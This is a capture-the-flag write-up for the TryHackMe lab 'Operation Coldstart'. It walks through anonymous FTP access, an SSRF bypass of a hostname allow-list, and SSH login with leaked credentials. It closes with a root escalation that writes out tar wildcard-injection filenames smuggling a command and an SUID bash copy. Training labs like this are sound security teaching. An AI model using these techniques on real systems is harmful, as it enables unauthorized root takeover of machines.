# Operation Coldstart - TryHackMe Write-up

- **Platform:** [TryHackMe](https://tryhackme.com/)
- **Room:** Operation Coldstart
- **Difficulty:** Easy
- **Category:** Web Exploitation & Privilege Escalation
- **Tools Used:** Kali Linux, Nmap

## 1. Challenge Overview
The scenario places us in a simulated penetration test against **Volt Labs**, a small software company. The company suspects that an old staging server was left running and has turned into an exposed security risk. 

The main objective is to discover how to break in from the outside, retrieve the user flag as a low-privileged user (`webdev`), and escalate privileges to the **root** user to achieve complete system compromise.

<img width="1021" height="471" alt="image" src="https://github.com/user-attachments/assets/66a5c4b1-329f-4db4-a878-86b9db34fadf" />

---



## 2. Reconnaissance & Initial Scan

<details>
<summary>Click here</summary>

#### 1. Opened the terminal to scan the target IP address using **Nmap** to discover all accessible network ports and running services.
   
```bash
nmap -Pn -sC -sV -T4 <TARGET_IP>
```

> In computer networking, services run on numbered ports (e.g., Port 80 for websites, Port 22 for remote login). Before we can attack a target, we need to map out every open door so we know where potential security weaknesses might exist.

**Detailed Flag Breakdown**
  - Pn (No Ping): Many servers and firewalls block ICMP ping probes. Using -Pn tells Nmap to treat the target as active and skip the ping check, avoiding false "host down" reports.

  - sC (Default Scripts): Runs standard automated enumeration scripts to detect common vulnerabilities and default settings (such as guest access).

  - sV (Service Version Detection): Probes open ports to identify the exact software name and version number running instead of guessing based on port numbers.

  - T4 (Aggressive Timing): Speeds up the scan duration so it completes quickly across the top 1,000 common ports without causing network congestion.


#### 2. Findings & Next Step
The port scan returned three open TCP ports:

<img width="667" height="418" alt="image" src="https://github.com/user-attachments/assets/326d8ec5-7b50-47ef-a8ff-00080714b3c2" />

    
- Port 21/tcp (FTP - vsftpd 3.0.5):

The scan identified that Anonymous FTP login allowed is enabled.

> Why this is important: Anonymous login is a critical misconfiguration that allows any user to connect without credentials. The scan also revealed an accessible folder named pub.

- Port 22/tcp (SSH - OpenSSH 9.6p1):

A secure remote administration shell on Ubuntu Linux.

> Why this is important: SSH requires valid user credentials, which we do not have yet. As soon as we got, we one step closer to achieve the flag.

- Port 80/tcp (HTTP - Gunicorn):

A web application titled "URL Preview - Volt Labs" running on Python's Gunicorn server.

</details>

## 3. Initial Access via Anonymous FTP

<details>
<summary>Click here</summary>

### Why Investigate FTP First?
When a file server allows anonymous logins, checking the exposed files is always the highest-priority step. Developers and system administrators frequently store source code archives, database dumps, or configuration backups in FTP directories. Analyzing this code allows us to understand the application logic and uncover hidden vulnerabilities much faster than testing the web interface blindly.

---

### Step 1: Connecting to the FTP Service
Connected to the target machine's FTP port using the built-in Linux command-line client:

    ftp <TARGET_IP>

When prompted for the username, entered anonymous.
   
Left the password blank by pressing Enter.

<img width="321" height="130" alt="image" src="https://github.com/user-attachments/assets/bfe6662b-b77f-43a1-80f2-78281c3c80b5" />


### Step 2: Downloading the Backup Archive

Listed the files in the root FTP directory to locate the exposed public folder:

    ftp> ls

Changed the working directory to pub and identified the compressed archive backup.tar.gz:

```bash
   ftp> cd pub
   ftp> ls
```

Switched the transfer mode to binary mode and donwload the archive file
   > Why Binary Mode? By default, FTP may transfer files in ASCII text mode, which alters line endings and corrupts non-text files. The binary command tells FTP        to transfer the file byte-for-byte as raw data so the archive remains uncorrupted.

   ```
   ftp> binary
   ftp> get backup.tar.gz
   ftp>exit 
   ```

<img width="586" height="370" alt="image" src="https://github.com/user-attachments/assets/61f47ade-61b9-4978-bef9-9bb2d7c974a1" />

### 3. Decompressing and Extracting the Source Code

Returned to the local terminal and extracted the downloaded .tar.gz archive:

```
   tar -xzvf backup.tar.gz
```

> - -x (Extract): Tells tar to unpack the bundled files.

> - -z (Gzip): Tells tar to decompress the gzip compression algorithm.

> - -v (Verbose): Prints the names of the files as they are unpacked.

> - -f (File): Specifies the archive filename to operate on.

<img width="270" height="87" alt="image" src="https://github.com/user-attachments/assets/7653c403-5a93-4404-a4af-70a05f603357" />


> **Analysis of the Extracted Files:**
> The extraction process created a directory named voltlabs-preview/ containing three items:

> - requirements.txt: Lists the external Python libraries and dependencies required to run the web application (such as Flask or Requests).

> - README.md: Documentation or notes left behind by the developers regarding the service setup.

> - app.py: The main Python source code file running the web application on Port 80. Inspecting this file provides direct visibility into backend routing, access control logic, and potential security vulnerabilities.

</details>


## 4. Source Code Analysis & Vulnerability Identification

<details>
<summary>Click here</summary>

### Step 1: Inspecting the Backend Code
Opened `app.py` in a text editor to analyze how the web application handles user requests and routes:

<img width="866" height="700" alt="image" src="https://github.com/user-attachments/assets/f9e2e405-fe79-4d9e-b170-f6037d097f97" />

### Step 2: Understanding the Vulnerability (SSRF)
Analysis of app.py reveals two critical logic mechanisms:

#### 1. Restricted Admin Endpoint (/admin/notes):

  - The application hosts an internal administrative endpoint at /admin/notes that reads sensitive data from /opt/voltlabs-preview/admin_notes.txt.
  
  - Access is guarded by an IP check: request.remote_addr.startswith("127.").
  
  - Visiting this URL directly from our external browser results in an immediate 403 Forbidden error because our IP is not localhost (127.0.0.1).

#### 2. Flawed Allow-list Validation in /preview:

  - The /preview feature accepts a user-supplied URL and makes an outbound backend request using Python's requests.get().
  
  - The only validation performed is checking whether urlparse(target).hostname is in ALLOWED_HOSTS (["kestrel.thm"]).
  
  - The system’s internal hostname kestrel.thm resolves locally to 127.0.0.1.


**Why This Leads to Server-Side Request Forgery (SSRF):**

Because the server trusts kestrel.thm and resolves it to its own local loopback address, an external user can supply an internal target like ```
```
http://kestrel.thm/admin/notes.
```
When the backend processes the request:

- The allow-list check passes because the domain is kestrel.thm.

- The server sends an internal HTTP request to itself (127.0.0.1).

- The /admin/notes endpoint receives the request from 127.0.0.1, bypassing the 403 remote address filter and returning the file contents back to the user interface.

<img width="917" height="277" alt="image" src="https://github.com/user-attachments/assets/0df3bd5f-eaea-443f-bc5b-ba78c9331c12" />

**AND BOOM, WE GOT THE SSH CREDINTIALS !**

</details>

## 5. Exploitation & Initial Foothold

<details>
<summary>Click here</summary>

### Step 1: Gaining Remote Access via SSH

With valid user credentials exposed, we can authenticate directly to the SSH service running on Port 22.

Enter username

Enter the password

### Step 3: Retrieving the User Flag

and then you found user.txt file and read it.

**USER FLAG WAS SUCCESSFULLY CAPTURED**

</details>


## 6. Privilege Escalation: Tar Wildcard Injection

<details>
<summary>Click here</summary>

### Step 1: Checking Scheduled Background Tasks (Cron Jobs)
Once we got in as the standard user, our goal was to become the admin (`root`) so we could read the final flag. 

First, we checked for automated tasks (Cron Jobs) running in the background:

```bash
cat /etc/cron.d/*
```

**What We Found:**

Inside ```/etc/cron.d/voltlabs-backup```, there was this task:

```
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

- ``` * * * * * ```: Runs automatically every single minute.

- ``` root ```: The computer runs this command with full admin powers.

- ``` cd /opt/backups && tar czf ... * ``` : The system goes into /opt/backups and uses the star symbol (*) to zip up every file inside that folder.

### Step 2: Why This is a Big Security Flaw

In Linux, the star symbol ```(*)``` is a wildcard. It simply means "every file in this folder."

When the computer runs ```tar ... *```, it replaces * with a list of all filenames in the folder.

The tar program has special built-in options:

- ``` --checkpoint=1```: Pauses after processing 1 file.

- ```--checkpoint-action=exec=<command>``` : Runs any custom command you want during that pause.

Because our user is allowed to create files inside /opt/backups, we can create empty files named just like those command options. When tar runs, it gets confused and runs our filenames as commands with root privileges instead of treating them as normal files.

### Step 3: Setting Up the Exploit

Run these commands step by step: 

```cd /opt/backups ```

```echo 'cp /bin/bash /tmp/bash; chmod +xs /tmp/bash' > shell.sh chmod +x shell.sh```

Make a simple script called shell.sh that makes a copy of the command terminal (bash) in /tmp and adds special permissions (called SUID) so anyone who opens it gets root powers:

```touch -- "--checkpoint=1"```

```touch -- "--checkpoint-action=exec=sh shell.sh"```

Create the two fake filenames that trick tar:

> (Note: The -- just tells Linux to create filenames starting with dashes without getting confused).

### Step 4: Getting the Root Shell & Reading the Flag

Launch the new root terminal we created in /tmp:

```/tmp/bash -p```

> (The -p makes sure Linux does not drop our admin powers).

Check that you are now root and grab the final flag:

> Your terminal prompt will change to # and whoami will say root, meaning you have completely taken over the machine!

</details>

